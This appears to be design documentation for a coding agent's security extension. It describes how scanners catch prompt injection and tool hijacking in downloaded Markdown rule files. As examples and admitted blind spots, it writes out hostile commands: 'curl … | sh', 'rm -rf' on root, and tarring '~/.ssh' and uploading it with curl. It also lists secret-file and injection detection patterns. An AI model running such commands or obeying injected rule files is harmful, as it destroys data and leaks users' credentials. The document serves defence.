# Security model

Rule files live in `.pi/context/` and are plain Markdown — but they are not
inert: the frontmatter describes *behavior* (which tools to guard, what to
patch, what to confirm) and the body is *context injected into the agent*.
Both are attacker-controllable when a file comes from the Internet. This page
explains how the engine protects you. It is the honest version: what the
scanner can see, what it cannot, and where the limits are.

Everything below lives in `.pi/extensions/context-engine/security/` (types,
unicode, encoding, markdown, rules, commands, scan, trust, actions, npm,
urlhaus, config) and runs with **zero runtime dependencies** — Node built-ins
only (`node:crypto` for SHA-256, native `fetch` for the optional network
signals).

## Overview: two independent barriers

**Barrier A — load-time scan gate** (`securityGate` in `index.ts`). On every
load (`session_start`, `/nma reload`), each `.md` file in `.pi/context/` is:

1. normalized (`\r\n` → `\n`) and **decoded** (base64/hex/URL-encoding,
   recursively, depth 2 — decoded content is scanned, never written back);
2. scanned: unicode, hidden Markdown, prompt-injection signatures, external
   references, and the **frontmatter scanned separately as code**;
3. aggregated into `none / low / medium / high / critical` and filtered
   through the trust store (path + SHA-256).

The gate runs *before* parsing. A file that fails the scan never reaches the
rule loader.

**Barrier B — action barrier** (`securityBarrier` in `index.ts`). On every
`tool_call` and `user_bash`, the actual tool input is scanned **before** user
rules run. A `block` short-circuits the rule loop — user rules cannot lift it
(`modify` cannot prefix a blocked command).

**Barrier B is conditional.** The extension is a bridge between pi and the
user, not a default command enforcer: the action barrier only runs while at
least one loaded rule file is **not explicitly trusted** (hash-approved) —
see *Command guard* below. No context files, or all files trusted, means the
extension never imposes command confirmations. Rule-declared
`confirm`/`block` actions are the user's own design and stay active
regardless.

**Why both?** The frontmatter is *executable behavior*: a malicious
`action: modify` with `prepend: curl … | sh` hijacks tools even if the body is
clean — so the frontmatter must be scanned as code. The body, by contrast, is
*prompt injection* aimed at the model: the scanner cannot predict what the
model will do with injected text, so the action the model actually takes is
guarded separately at the tool boundary. Barrier A filters content, barrier B
guards actions; neither depends on the other.

## Command guard — when does the extension impose confirmations?

The security model is **explicit trust of context files**: you review what
you load. The command guard (barrier B) exists only as a backstop for files
you have **not** reviewed yet.

- **Armed** ⇔ at least one loaded rule file is absent from the trust store
  (never hash-approved by you). That covers silent `low`/`none` loads and
  downloaded/shared files — the manipulation surface.
- **Disarmed** when every loaded file is trusted, or when no rule file is
  loaded at all. All-trusted ⇒ the extension imposes **zero** command
  confirmations.
- When it arms, a one-time notification explains why, and points to
  `/nma security` (state: `Command guard: ON/OFF`) and to
  `/nma trust <file>` — reviewing and approving a file removes it from the
  untrusted set and relaxes the guard.
- Approval is per exact content (path + SHA-256): any content change revives
  the review, and with it the guard.
- Your own rule files declaring `action: confirm` / `action: block` keep
  working exactly as written — the guard is the extension's default; the
  rules are your design.

## Categories & signals

| Category | What it detects | Finding ids (examples) |
| --- | --- | --- |
| `prompt-injection` | instruction override, system-prompt extraction, impersonation (`[SYSTEM]`…), persona hijack, tool manipulation, RAG poisoning | `pi-override`, `pi-system-extract`, `pi-impersonation`, `pi-persona`, `pi-tool-manip`, `pi-rag` |
| `obfuscation` | zero-width / BIDI characters, homoglyphs, normalization anomalies; base64/hex/URL-encoded blobs (recursive, depth 2); instructions hidden in HTML comments or Markdown link text | `uni-zerowidth`, `uni-bidi`, `obf-base64-cmd`, `obf-<kind>-cmd`, `obf-<kind>`, `md-comment-instr`, `md-link-instr` |
| `external` | URLs classified by their lexical neighborhood: "download and follow instructions", "read the instructions at …", plain doc URLs (low or nothing) | `ext-exec` (terminal), `ext-instructions-download`, `ext-instructions-read`, `ext-instructions`, `ext-doc` |
| `command` | shell pipelines as *actions*: download+exec (including file-mediated across `&&`/`;`), base64→shell, interpreter inline eval (`-c`/`-e`/`-p`/`-r`), destructive targets, privilege escalation, persistence, global installs | `cmd-dl-exec` (terminal), `cmd-obf-exec` (terminal), `cmd-interp-eval`, `cmd-destructive` (terminal), `cmd-priv-esc`, `cmd-persist`, `cmd-install-global`, `cmd-install` (low) |
| `secrets` / `exfiltration` | secret-material paths (`.ssh`, `.env`, `.pem`, `id_rsa`, AWS credentials, `.npmrc`); secret read combined with a network transfer | `cmd-secret-read`, `cmd-secret-exfil` (terminal), `act-secret-path` |
| `supply-chain` | npm Registry metadata + OSV vulnerabilities on install commands; direct tarball URLs, `git+` deps | `cmd-tarball-url`, `cmd-nonregistry`, `cmd-install-script`, `cmd-install-young`, `cmd-deprecated`, `cmd-osv-vuln` |
| `tool-hijack` | frontmatter scanned as behavior: `modify`/`tools`/`transform`/`handled`/`confirm` present, tools enabled, network+execution in `modify` commands, generic confirm messages | `th-action-present`, `th-tools`, `th-modify-netexec` (terminal), `th-modify-net`, `th-confirm-generic` |

Deliberate non-signals: a plain URL is not a finding, "base64 present" is not
dangerous (decoded content decides), `npm install` alone is never dangerous,
and there is no domain whitelist anywhere.

## Scoring & levels

Each finding carries a severity with a SkillsGuard-derived weight
(`security/types.ts`):

```ts
export const WEIGHTS = { info: 0, low: 1, medium: 3, high: 10, critical: 25 };
```

Aggregation (`aggregate`, calibrated — the fixture corpus is the gate):

- one **terminal** finding (or severity `critical`) forces the whole file or
  action to `critical`, whatever the score;
- otherwise the sum per severity is `Σ round(weight × log2(count + 1))`;
- final thresholds: **total 0 → `none` · ≤ 4 → `low` · ≤ 12 → `medium` ·
  ≤ 24 → `high` · ≥ 25 → `critical`**.
- a single **medium**+ finding never aggregates below `medium` — one real
  signal always prompts. Calibrated consequence: `npm i -g`, a lone `curl`
  download, or a single quoted attack phrase now confirm instead of loading
  silently.

The provenance nudge (see below) can raise the level one step. A scan error
never blocks loading silently: the file is treated as `high` risk and skipped.
Network enrichment can only raise a level, on install commands only.

## UX: what you see

Barrier A (rule files, at load):

| Level | With UI | Without UI |
| --- | --- | --- |
| `none` / `low` | loaded silently | loaded silently |
| `medium` | confirm with details — approved → stored in the trust store + loaded; declined → skipped + notify | skipped, console log |
| `high` | same, full details | skipped, console log |
| `critical` | **blocked, never auto-prompted**; notify explains `/nma trust <file>` | blocked, console log |
| already trusted | loaded silently, whatever the level (path + hash match) | same |

Barrier B (actions — only while the command guard is armed, see *Command guard*):

| Level | Behavior |
| --- | --- |
| guard disarmed | every action allowed silently — no extension-imposed confirmations |
| `none` / `low` | allowed silently |
| `medium` / `high` | confirm with findings; declined → blocked |
| `critical` | confirm: "Approve this dangerous action anyway? (one-time, never persisted)" |
| scanner exception | **blocked** (fail-closed, never a silent allow) |

An action approval is **one-time, never persisted** — the next identical
command is asked again. Without a UI, every confirmation is fail-safe:
`block`. A `block` stops the user-rule loop before any rule sees the action.

## Trust store

- Global file **`~/.pi/agent/nma-trust.json`** (override with
  `NMA_TRUST_FILE`).
- Key = **canonical path** (`path.resolve`), value =
  `{ sha256, approvedAt, provenance, level }`.
- Trust = **path + content hash**, never path alone. Any content change makes
  `status()` return `changed` → the approval is invalid → the file is
  re-scanned and re-decided. The hash computed by the gate is re-verified at
  load time: a file whose content changed between scan and load is rejected
  (fail-closed), never loaded under a stale approval.
- Writes are atomic (unique temp file — pid + timestamp — then rename, so two
  pi sessions never clobber each other's temp) with mode `0600`; a write
  failure is logged and non-fatal (the in-memory store stays authoritative
  until the next successful write). A corrupt store is reported as a warning
  and treated as empty — it never crashes a load.
- Approval happens automatically when a `medium`/`high` confirm is accepted,
  or explicitly with `/nma trust <file>`. Revoke with `/nma untrust <file>`
  (immediate reload). `/nma security` lists every scanned file with its
  level, load state, trust state, and findings.

## Provenance

Best-effort classification from the signals available at load time: project
trust (`ctx.isProjectTrusted()`), git tracking (`git ls-files`, silent on
failure), and mtime:

- `user` — the default;
- `downloaded` — untracked by git **and** modified within the last hour;
- `untrusted-project` — the project itself is untrusted.

The **nudge** is one step: a `downloaded` / `untrusted-project` file with
findings gets its level raised one step (`low → medium → high`). It never
raises `none`, and `high` only rises to `critical` when a terminal finding is
present — a CRITICAL decision always requires a terminal finding or a
`≥ critical` score. Missing signals never downgrade a file. The provenance is
recorded in the trust entry.

## Network behavior

The core — load scan and action scan — is **fully offline and synchronous**.

Network enrichment (`security/npm.ts`) runs **only** for install commands
(`npm install/i/ci`, `yarn add`, `bun add`, `pnpm add/install`, `npx`, `pip
install`, `cargo install`; pip/cargo names are recognized but have no lookup
API):

- npm Registry metadata (`hasInstallScript`, deprecated, age) + one OSV
  `querybatch` for versioned npm targets;
- in-memory cache, TTL **1 hour**; per-request timeout **3 s**
  (`AbortSignal.timeout(3000)`);
- API failure, 5xx, timeout, invalid JSON → **no finding, level unchanged** —
  an API failure is `unknown`, never `safe`; an OSV "no result" is also not
  `safe`, it is just no signal;
- `NMA_NETWORK=0` disables all network enrichment.

URLhaus (`security/urlhaus.ts`) is an opt-in host-reputation module gated on
`NMA_URLHAUS_KEY`, disabled by default; API failure returns `null`, never a
"safe" answer. Honest note: the module is currently **not wired into the
decision pipeline** — enabling the key alone changes nothing today; it ships
as a tested, ready-to-integrate building block.

## False positives / false negatives — the honest limits

- **`low` is not "safe".** It means "no significant signal detected". A
  scanner cannot prove a file is benign.
- The scanner sees **text and structure only**. It cannot see dynamic tool
  output, and it cannot see how the model *interprets* an injected body.
  Barrier B protects the actions the model takes — not its reasoning. A
  cleverly worded body can still influence the model; the barriers raise the
  cost and catch the mechanical attacks (obfuscation, overrides, download+exec,
  tool hijack).
- **Evasion coverage.** Fenced code blocks are scanned — capped at `high` and
  never auto-critical (a payload in a fence always prompts, a benign example
  stays silent); zero-width, LRM/RLM, word-joiner and control characters are
  normalized before signature matching, and a trigger that only matches after
  normalization is `medium`+; trigger phrases split across line breaks are
  recombined; at barrier B, base64/hex/URL-decoded content is re-scanned as a
  command, and `base64 -d` piped to a shell is terminal (`cmd-obf-exec`);
  interpreter inline eval (`python3 -c`, `node -e`, `php -r`…) is flagged
  `medium` by default — the payload is opaque, that is the honest cost;
  `modify.prepend/append` is scanned with the full command scanner;
  exfiltration via `nc < secret` or `tar | curl @-` is caught.
- **DoS posture.** Positions are resolved through a precomputed line index
  (`security/position.ts`, O(log n) per lookup — no quadratic scans); findings
  per file are capped at 2000 and pushed in a loop (no spread overflow); all
  regexes are simple, bounded and linear — no catastrophic backtracking.
  Adversarial perf tests lock this in: 20 000 base64 blobs under 1 s, a
  300 KB decode-bomb stays bounded without throwing.
- **Honest limits.** Pure-homoglyph words (all non-ASCII letters) are not
  flagged — realistic payloads always mix ASCII and are caught; env-var
  indirection (`DIR=/; rm -rf $DIR`) is not resolved; a user's own
  `match.regex` is unbounded (ReDoS gated to files that are scanned and
  approved); the trust store's final rename is last-writer-wins (a lost
  approval is fail-closed, never fail-open); interpreter payloads stay opaque
  (flagged `medium` by default, `high` when they contain destructive/network
  tokens); `--eval` long forms are not covered; file-mediated upload across
  `;` (`tar czf t.tgz ~/.ssh; curl -F file=@t.tgz URL`) is not covered; a URL
  whose instruction sits 80+ characters away on the same line keeps a bounded
  window (anti-false-positive, the adjacent-line context still applies).
- **The calibration corpus is the permanent gate** (`security/fixtures/`,
  75 Markdown files + `expected.json`, including an intentional
  `false-positives/` set): any scoring change must keep it green — benign ≤
  `low`, false-positives ≤ `medium`, malicious ≥ `high`. Performance budget
  tests keep a 100-file load under 300 ms and adversarial inputs bounded
  (20 000 blobs < 1 s, 300 KB decode-bomb capped).
- Fail-safe defaults everywhere: scan error at the gate → `high`/skip, never a
  silent load; no UI → confirm means `block`; a scanner exception at the
  action barrier **blocks** the action (fail-closed, never a silent allow).

## Rule sources & attribution

- **OWASP LLM Prompt Injection Cheat Sheet** and **PayloadsAllTheThings** —
  signature families (instruction override, system-prompt extraction,
  impersonation, tool manipulation, RAG poisoning), adapted, never copied as
  blind blacklists.
- **SkillsGuard** (MIT) — severity weights and the `log2(count+1)`
  aggregation model, recalibrated on the fixture corpus.
- **PromptShield** (MIT) — the unicode-scanning approach (zero-width, BIDI,
  homoglyphs, normalization anomalies).

Every pattern is *contextualized*: a lone phrase in a documentation file is
`low` confidence; an imperative line with a dangerous verb is `high`; only
combined behaviors (download + execute, secret + network, network + exec in
`modify`) become terminal. Zero runtime dependencies.
